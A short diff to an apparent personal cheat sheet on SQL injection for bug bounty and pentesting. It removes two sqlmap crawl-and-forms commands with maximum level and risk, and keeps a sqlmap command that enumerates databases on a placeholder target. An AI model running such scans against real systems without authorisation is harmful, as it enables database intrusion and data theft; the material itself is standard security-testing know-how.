@@ -40,9 +40,6 @@ SQLinjections  are important if you want to try your lucky in Bugbounty or pente
 
 SQLMAP automatic tool to explote SQL injections 
 
-# Crawl the links
-sqlmap -u http://<targetip> --crawl=1
-sqlmap -u http://<targetip> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
 
 # Search for databases
 sqlmap –u http://<targetip>/index.php?par= –dbs
